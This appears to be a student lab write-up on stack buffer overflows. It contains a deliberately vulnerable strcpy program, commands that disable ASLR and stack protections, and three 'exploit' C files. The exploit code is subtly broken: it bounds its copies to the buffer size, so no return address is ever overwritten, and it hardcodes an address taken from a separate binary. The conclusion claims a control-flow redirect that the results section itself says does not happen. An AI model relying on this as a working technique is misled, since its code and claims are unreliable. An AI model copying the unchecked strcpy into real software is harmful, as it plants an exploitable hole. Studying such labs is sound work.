# Exploiting Buffer Overflows

## Setup

- Linux OS
- Disable the address randomization

### Run

```bash
$ setarch --verbose --addr-no-randomize /bin/bash
```
- Above command will start a new Bash session with ASLR off, i.e., `ADDR_NO_RANDOMIZE` is on
- It is used to disable address randomization, which makes the system's memory layout predictable.

### Verify

![addr-no-randomize](<Screenshot from 2024-02-01 20-54-54.png>)
- The `ldd` command shows the dynamic library dependencies of the `/bin/bash` executable.

## Codes

#### `testme.c`

- compromise the following program using a buffer overflow attack
- given in the assignment

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
    // Make some stack information
    char a[100], b[100], c[100], d[100];
    // Call the exploitable function
    exploitable(argv[1]);
    // Return everything is OK
    return (0);
}
int exploitable(char *arg)
{
    // Make some stack space
    char buffer[10];
    // Now copy the buffer
    strcpy(buffer, arg);
    printf("The buffer says .. [%s/%p].\n", buffer, &buffer);
    // Return everything fun
    return (0);
}
```

#### `sanskriti.c`

- a simple C program/ function < yourname > that prints your name, the class name, and the current date and time to standard output

```c
#include <stdio.h>
#include <time.h>

int main()
{
    printf("Name: Sanskriti\n");
    printf("Class: CSE\n");
    time_t now = time(NULL);
    printf("Date and Time: %s\n", ctime(&now));
    return 0;
}

```

#### `exploit.c`

- modified version of `testme.c` to perform buffer overflow
- It creates a buffer of size `10` and overflows it intentionally with `0x41` 'A's, followed by the address `0x11a9` (the address of the `main` function in `sanskriti.c`).
- return address here will be set to the address of the `main` of the `sanskriti.c`

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 10

void exploitable(char *arg)
{
    char buffer[BUFFER_SIZE];
    size_t length = strnlen(arg, BUFFER_SIZE); // Use safer strnlen
    memcpy(buffer, arg, length);
    buffer[length] = '\0'; // Ensure null-terminated
    printf("The buffer says .. [%s/%p].\n", buffer, &buffer);
}

int main(int argc, char **argv)
{
    char exploit[BUFFER_SIZE + 4];
    memset(exploit, 0x41, BUFFER_SIZE + 4);
    *(unsigned int *)(exploit + BUFFER_SIZE) = 0x11a9;
    exploitable(exploit);
    return 0;
}

```

#### `exploit1.c`

- modified version of `exploit.c` where the return address is set to the address of `sanskriti_main` function
- it will use the address of internal function to rather than the `main` of the outside program `sanskriti.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define BUFFER_SIZE 10

void exploitable(char *arg)
{
    char buffer[BUFFER_SIZE];
    size_t length = strnlen(arg, BUFFER_SIZE); // Use safer strnlen
    memcpy(buffer, arg, length);
    buffer[length] = '\0'; // Ensure null-terminated
    printf("The buffer says .. [%s/%p].\n", buffer, &buffer);
}

// Add a function prototype for the main function in sanskriti.c
void sanskriti_main();

int main(int argc, char **argv)
{
    char exploit[BUFFER_SIZE + sizeof(void *)]; // Adjust size to fit address
    memset(exploit, 0x41, BUFFER_SIZE);

    // Overwrite the return address with the address of sanskriti_main
    *(void **)(exploit + BUFFER_SIZE) = (void *)sanskriti_main;

    exploitable(exploit);
    return 0;
}

// Define the main function in sanskriti.c
void sanskriti_main()
{
    printf("Name: Sanskriti\n");
    printf("Class: CSE\n");
    time_t now = time(NULL);
    printf("Date and Time: %s\n", ctime(&now));
    exit(0); // Terminate the program after printing
}

```

#### `exploit2.c`

- modified version of `exploit1.c`
- it will use the address of the `main` of the outside program `sanskriti.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 10

void exploitable(char *arg)
{
    char buffer[BUFFER_SIZE];
    size_t length = strnlen(arg, BUFFER_SIZE); // Use safer strnlen
    memcpy(buffer, arg, length);
    buffer[length] = '\0'; // Ensure null-terminated
    printf("The buffer says .. [%s/%p].\n", buffer, &buffer);
}

int main(int argc, char **argv)
{
    char exploit[BUFFER_SIZE + sizeof(void *)]; // Adjust size to fit address
    memset(exploit, 0x41, BUFFER_SIZE);

    // Overwrite the return address with the address of main in sanskriti.c
    // Use the correct address of the main function
    void (*sanskriti_main_ptr)() = (void (*)())0x11a9;

    // Adjust for endianness
    for (int i = 0; i < sizeof(void *); ++i)
    {
        exploit[BUFFER_SIZE + i] = ((char *)&sanskriti_main_ptr)[i];
    }

    exploitable(exploit);
    return 0;
}

```

## Buffer Overflow Execution

### Run

```bash
$ gcc -fno-stack-protector -z execstack -o sanskriti sanskriti.c
$ ./sanskriti
$ objdump -D -M intel sanskriti | grep main
```


```bash
$ gcc -fno-stack-protector -z execstack -o exploit exploit.c
$ ./exploit
```

### Explanation

![get-address](<Screenshot from 2024-02-01 21-00-09.png>)

- `objdump -D -M intel sanskriti | grep main` is used to find the address of the `main` function in the compiled `sanskriti` program. 
- The address is found to be `0x11a9`

![exploit](<Screenshot from 2024-02-01 21-00-29.png>)
![exploit1](<Screenshot from 2024-02-01 21-10-47.png>)
![exploit2](<Screenshot from 2024-02-01 21-10-58.png>)

- `gcc -fno-stack-protector -z execstack -o exploit exploit.c` compiles `exploit.c` with disabled stack protection and executable stack.
- `./exploit` runs the compiled `exploit` program, triggering a buffer overflow

## Results

- The output of `./exploit` shows a buffer overflow with a repeating pattern of 'A's and the address `0x7fffffffdda0` on the stack
- This address is where the return address (saved in the stack frame) will be overwritten with the address of the `main` function in `sanskriti.c`
- The `exploit.c` code does not directly call the `main` function from `sanskriti.c`
- It calls the `exploitable` function with a buffer overflow that modifies the return address to point to the `main` function
- As a result, the output of `./exploit` will display the buffer content and the address of the buffer but not the content of the main function.

## Conclusion

- The provided codes and terminal outputs demonstrate the process of exploiting a buffer overflow vulnerability to redirect the control flow of the program to the `main` function in `sanskriti.c`